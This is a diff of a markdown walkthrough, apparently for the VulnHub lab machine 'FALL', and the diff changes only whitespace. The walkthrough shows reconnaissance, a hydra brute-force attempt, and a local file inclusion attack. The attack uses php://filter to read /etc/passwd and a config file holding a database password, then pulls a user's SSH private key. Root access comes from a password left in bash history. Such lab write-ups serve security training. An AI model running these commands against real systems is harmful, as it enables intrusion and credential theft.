@@ -11,7 +11,9 @@ image:
 ---
 
 # Recon
+
 ## NMAP Complete Scan
+
 ```
 # Nmap 7.92 scan initiated Tue Feb  8 17:14:08 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Digitalworld.local-FALL/192.168.110.20/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Digitalworld.local-FALL/192.168.110.20/scans/xml/_full_tcp_nmap.xml 192.168.110.20
 Nmap scan report for 192.168.110.20
@@ -156,7 +158,9 @@ OS and Service detection performed. Please report any incorrect results at https
 ```
 
 ## TCP/80 (HTTP)
+
 ### FFUF - common.txt
+
 ```
 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL]
 └─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'
@@ -216,6 +220,7 @@ tmp                     [Status: 301, Size: 234, Words: 14, Lines: 8]
 uploads                 [Status: 301, Size: 238, Words: 14, Lines: 8]
 :: Progress: [18460/18460] :: Job [1/1] :: 633 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
 ```
+
 - `admin`
 - `assets`
 - `error.html`
@@ -226,10 +231,13 @@ uploads                 [Status: 301, Size: 238, Words: 14, Lines: 8]
 - `config.php`
 
 ## TCP/443 (HTTPS)
+
 - Same results as `TCP/80`
 
 ## TCP/9090 (HTTP)
+
 ### FFUF - common.txt
+
 ```
 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL]
 └─# ffuf -u http://$ip:9090/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.cgi'  -fw 8876,3
@@ -260,22 +268,26 @@ favicon.ico             [Status: 200, Size: 413, Words: 1, Lines: 4]
 ping                    [Status: 200, Size: 24, Words: 4, Lines: 1]
 :: Progress: [23075/23075] :: Job [1/1] :: 908 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
 ```
+
 - `ping`
 
 ### NMAP
+
 ```
 PORT     STATE SERVICE REASON         VERSION
 9090/tcp open  http    syn-ack ttl 64 Cockpit web service 162 - 188
 ```
+
 - `Cockpit web service 162 - 188`
 
-
-
 ## TCP/139,445 (SMB)
+
 ### Enum4linux
+
 - No users enumerated
 
 ### SMBMap
+
 ```
 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20]
 └─# smbmap -H $ip
@@ -285,12 +297,13 @@ PORT     STATE SERVICE REASON         VERSION
 	print$                                            	NO ACCESS	Printer Drivers
 	IPC$                                              	NO ACCESS	IPC Service (Samba 4.8.10)
 ```
-- No access to any fileshare
 
+- No access to any fileshare
 
 # Initial Foothold
 
 ## TCP/80 (HTTP) - LFI (Include config.php, failed)
+
 1. View enumerated directories
 	- `admin`
 		![](Pasted%20image%2020220208175256.png)
@@ -311,17 +324,23 @@ PORT     STATE SERVICE REASON         VERSION
 	- javascript `alert('Missing GET parameter')`
 3. Search exploits for `CMS Made Simple v2.2.15`
 	
+
 	| Exploit Title                                | Pat                   |
+
 	| -------------------------------------------- | --------------------- |
+
 	| CMS Made Simple 2.2.15 - RCE (Authenticated) | php/webapps/49345.txt | 
 
 	- Requires authentication
 4. Tried to bruteforce `/admin.php`, failed
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
 	└─# hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" -V
 	```
+
 5. Fuzz for LFI vulnerability at `test.php?<Get Parameter>=<LFI>`
+
 	```
 	┌──(root💀kali)-[/usr/share/wordlists]
 	└─# ffuf -u http://$ip/test.php?W1=W2 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:W1 -w /usr/share/wordlists/LFI/file_inclusion_linux.txt:W2  -fw 3
@@ -366,7 +385,9 @@ PORT     STATE SERVICE REASON         VERSION
 
 	[WARN] Caught keyboard interrupt (Ctrl-C)
 	```
+
 	![](Pasted%20image%2020220208190041.png)
+
 6. Include files that can lead to RCE
 	1. Enumerate files that can lead to RCE
 		- Did not find any log files we can poison
@@ -374,6 +395,7 @@ PORT     STATE SERVICE REASON         VERSION
 		- [`config.php` details](https://docs.cmsmadesimple.org/configuration/config-file)
 	3. View source code of `config.php` using `PHP Wrapper, php://filter`
 	4. Check if `php://filter` works, by including files that we know exists
+
 		```
 		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
 		└─# curl -s http://192.168.110.20/test.php?file=php://filter/convert.base64-encode/resource=../../../../../etc/passwd | base64 -d
@@ -410,7 +432,9 @@ PORT     STATE SERVICE REASON         VERSION
 		clevis:x:994:989:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
 		mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
 		```
+
 	5. Include `config.php`
+
 		```
 		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
 		└─# curl -s http://192.168.110.20/test.php?file=php://filter/convert.base64-encode/resource=config.php | base64 -d
@@ -428,21 +452,25 @@ PORT     STATE SERVICE REASON         VERSION
 		$config['db_port'] = 3306;
 		?>
 		```
+
 		- cms_user:`P@ssw0rdINSANITY`
 
-
 ## TCP/3306 (MySQL) - Unable to connect
+
 1. Access mysql w/ cms_user:`P@ssw0rdINSANITY`
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
 	└─# mysql -u cms_user -h $ip
 	ERROR 1130 (HY000): Host '192.168.110.4' is not allowed to connect to this MySQL server
 	```
+
 	-  Unable to connect to MySQL
 
-
 ## TCP/80 (HTTP) - LFI (Include id_rsa)
+
 1. Only option we did not try is to include `id_rsa` 
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
 	└─# curl -s http://192.168.110.20/test.php?file=../../../../home/qiu/.ssh/id_rsa | tee id_rsa
@@ -474,13 +502,17 @@ PORT     STATE SERVICE REASON         VERSION
 	uhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC
 	-----END OPENSSH PRIVATE KEY-----
 	```
+
 2. Obtain usernames
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
 	└─# curl -s http://192.168.110.20/test.php?file=../../../../etc/passwd | awk -F: '($3>=1000)&&($1!="nobody"){print $1}' | tee usernames.txt
 	qiu
 	```
+
 3. Fuzz for user's `id_rsa`
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
 	└─# ffuf -u http://$ip/test.php?file=../../../../../../home/FUZZ/.ssh/id_rsa -w usernames.txt
@@ -508,16 +540,20 @@ PORT     STATE SERVICE REASON         VERSION
 	qiu                     [Status: 200, Size: 1831, Words: 7, Lines: 28]
 	:: Progress: [1/1] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
 	```
+
 4. Change permissions of `id_rsa`
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
 	└─# chmod 600 id_rsa 
 	```
 
 ## TCP/22 (SSH)
+
 1. SSH w/ qiu's `id_rsa`
 ![](Pasted%20image%2020220208200210.png)
 2. Local Flag
+
 	```
 	[qiu@FALL ~]$ cat local.txt 
 	A low privilege shell! :-)
@@ -527,8 +563,10 @@ PORT     STATE SERVICE REASON         VERSION
 # Privilege Escalation
 
 ## Root - Via Creds Found
+
 1. View files in qiu's home directory
 2. View `.bash_history`
+
 	```
 	[qiu@FALL ~]$ cat .bash_history 
 	ls -al
@@ -558,10 +596,12 @@ PORT     STATE SERVICE REASON         VERSION
 	cat local.txt 
 	[qiu@FALL ~]$ cd ..
 	```
+
 	- root:`remarkablyawesomE`
 3. Obtain root shell
 	![](Pasted%20image%2020220208204223.png)
 4. Root Flag
+
 	```
 	[root@FALL ~]# cat proof.txt 
 	Congrats on a root shell! :-)
@@ -577,4 +617,3 @@ PORT     STATE SERVICE REASON         VERSION
 	Want to find the author? Find the author on Linkedin by rooting other boxes in this series!
 	[root@FALL ~]# 
 	```
-
